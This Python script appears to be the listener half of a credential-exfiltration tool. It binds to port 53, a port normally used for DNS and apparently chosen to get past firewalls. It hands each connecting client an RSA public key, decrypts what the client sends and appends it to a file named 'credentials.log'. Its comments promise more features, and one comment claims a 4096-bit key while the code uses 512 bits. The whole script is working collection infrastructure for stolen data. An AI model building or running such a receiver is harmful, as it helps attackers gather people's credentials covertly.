#!/usr/bin/python3
# _*_ coding: utf-8 _*_ 

#to do
#port-forwarding

#increased the buffer size
# added cryptography

# todo
# manages different connections separately

# Bug
# if fails to decrypt some data

import socket
import rsa

FILENAME = 'credentials.log'


def generatekey():
    publickey,privatekey = rsa.newkeys(512)  # 4096 bits
    serialized_publickey = publickey.save_pkcs1()  # to send the keys over a network in a standard format we use Serialization
    return serialized_publickey,privatekey
        

def main():

    # init keys
    serialized_publickey,privatekey = generatekey()

    #tcp connection
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    #binding the socket
    server.bind(('',53))

    #setting the server in listen mode
    server.listen()
    print('[+] Server is up!')

    try:
        while True:
            conn, addr = server.accept()
            print(f'[+] Connection from {addr[0]} on port {addr[1]}')

            # Sending the public key
            conn.send(serialized_publickey)

            try:
                while True:
                    # Receiving encrypted data from the client
                    data = conn.recv(4096)
                    
                    if not data:
                        print(f'[+] Connection Closed from {addr[0]} on port {addr[1]}')
                        break
                        

                    try:
                        data = rsa.decrypt(data, privatekey).decode('utf-8')
                    except rsa.DecryptionError:
                        print(f'[+] Decryption failed')
                        continue
                    

                    print(data)  # Print received data

                    # Logging the received data to a file
                    with open(FILENAME, 'a+') as fh:
                        fh.write(str(data))
                        fh.write('\n')

                print('[+] Received Successfully!')
                conn.close()  # Closing the connection
            
            except NameError as e:
                print(e)

    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    main()


